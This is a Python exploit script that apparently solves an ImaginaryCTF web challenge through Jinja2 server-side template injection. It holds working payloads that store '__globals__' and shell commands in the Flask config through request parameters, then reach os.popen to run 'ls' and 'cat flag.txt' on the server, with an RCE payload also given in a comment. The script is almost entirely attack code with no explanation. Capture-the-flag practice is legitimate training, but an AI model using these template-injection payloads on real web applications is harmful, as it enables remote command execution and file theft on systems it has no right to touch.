from pprint import pprint
import requests
import html

URL = "http://minigolf.chal.imaginaryctf.org/"

# payload: {{lipsum.__globals__.os.popen('ls').read()}}

print("-------- loop1: save __globals__ to config")
query_param = {
    "q": "__globals__",
    "txt": "{%if config.update(z=request.args.q)==1%}1{%endif%}"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "{% print config %}"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("\n-------- loop2: put ls command in the config")
query = "ls"
query_param = {
    "q": "ls",
    "txt": "{%if config.update(y=request.args.q)==1%}1{%endif%}"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "{% print config %}"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))


print("\n-------- loop3: run ls command")
query_param = {
    "txt": "{%print(lipsum|attr(config.z)).os.popen(config.y).read()%}"
}
response = requests.get(URL, params=query_param)
print("requestURL:", URL, query_param)
print("response web:", response.text)


print("\n-------- loop4: put cat flag.txt in config")
query_param = {
    "q": "cat flag.txt",
    "txt": "{%if config.update(y=request.args.q)==1%}1{%endif%}"
}
response = requests.get(URL, params=query_param)
config = requests.get(URL, params={
    "txt": "{% print config %}"
})
print("requestURL:", URL, query_param)
print("response web:", response.text)
print("injected config:", html.unescape(config.text))

print("\n--------loop5: print flag")
query_param = {
    "txt": "{%print(lipsum|attr(config.z)).os.popen(config.y).read()%}"
}
response = requests.get(URL, params=query_param)
print("requestURL:", URL, query_param)
print("response web:", response.text)

